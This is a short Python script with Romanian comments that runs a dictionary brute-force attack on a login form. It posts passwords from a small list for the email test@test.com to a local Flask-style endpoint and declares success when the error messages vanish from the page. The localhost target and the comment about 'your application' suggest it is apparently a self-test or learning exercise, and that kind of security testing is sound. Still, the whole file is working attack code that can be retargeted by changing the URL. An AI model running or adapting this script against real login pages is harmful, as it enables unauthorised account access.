import requests

# URL-ul de login al aplicatiei tale
url = "http://127.0.0.1:5000/login"

# Email-ul pe care vrem sa il spargem
target_email = "test@test.com"

# Un dictionar mic de parole (Brute Force dictionary)
passwords_to_try = ["parola", "admin123", "qwerty", "12345", "123"]

print(f"[*] Incepem atacul Brute Force pentru {target_email}...\n")

for pwd in passwords_to_try:
    print(f"[*] Incerc parola: {pwd}")

    # Trimitem requestul POST asa cum ar face-o browserul
    data = {"email": target_email, "password": pwd}
    response = requests.post(url, data=data)

    # Daca in codul HTML returnat nu mai apare "Parolă greșită", inseamna ca am intrat!
    if "Parolă greșită" not in response.text and "User inexistent" not in response.text:
        print(f"\n[+] SUCCES! Parola a fost gasita: {pwd}")
        break